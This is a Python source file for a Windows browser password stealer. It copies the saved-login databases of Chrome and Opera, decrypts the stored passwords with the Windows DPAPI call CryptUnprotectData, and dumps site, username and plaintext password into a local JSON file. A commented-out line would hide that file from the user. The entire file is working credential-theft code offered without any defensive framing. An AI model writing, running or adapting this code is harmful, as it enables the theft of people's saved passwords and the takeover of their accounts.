import sqlite3
import shutil
import win32crypt
import sys, os, platform, json

def decrypt(browser, mode):
	# Passwords
    pwdFound = []
    if mode == 'Logins':
    	command = 'SELECT action_url, username_value, password_value FROM logins'
    if mode == 'Cookies':
    	command = 'SELECT host_key, name, encrypted_value FROM cookies'
    database_path = browser['Path'] + browser[mode]

    # Copy database before to query it (bypass lock errors)
    try:
        shutil.copy(database_path, os.getcwd() + os.sep + 'tmp_db')
        database_path = os.getcwd() + os.sep + 'tmp_db'

    except Exception:
        pass

    # Connect to the Database
    try:
        conn = sqlite3.connect(database_path)
        cursor = conn.cursor()
    except Exception:
        return

    # Get the results
    try:
        cursor.execute(command)
    except:
        return

    pwdFound = []
    for result in cursor.fetchall():

        try:
            # Decrypt the Password
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception:
            password = ''

        if password:
            pwdFound.append({'Site':result[0], 'Username': result[1], 'Password':password.decode('utf-8', 'ignore')})

    conn.close()
    if database_path.endswith('tmp_db'):
        os.remove(database_path)
    return pwdFound

def main():
	bp = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH')
	browsers = [{
	'Name': 'Chrome', 
	'Path': bp+'/AppData/Local/Google/Chrome/User Data/Default/',
	'Logins': 'Login Data',
	'History': 'History',
	'Cookies': 'Cookies'
	},
	{
	'Name': 'Opera', 
	'Path': bp+'/AppData/Roaming/Opera Software/Opera Stable/',
	'Logins': 'Login Data',
	'History': 'History',
	'Cookies': 'Cookies'
	}]
	js0n = {}
	for x in range(len(browsers)):
		js0n[browsers[x]['Name']]=decrypt(browsers[x],'Logins')
	with open('pwds.json', 'a', encoding='UTF-8') as f:
		json.dump(js0n, f, indent=2, ensure_ascii=False)
	#os.system("ATTRIB /S /D +H +S pwds.json")

if __name__ == '__main__':
	main()
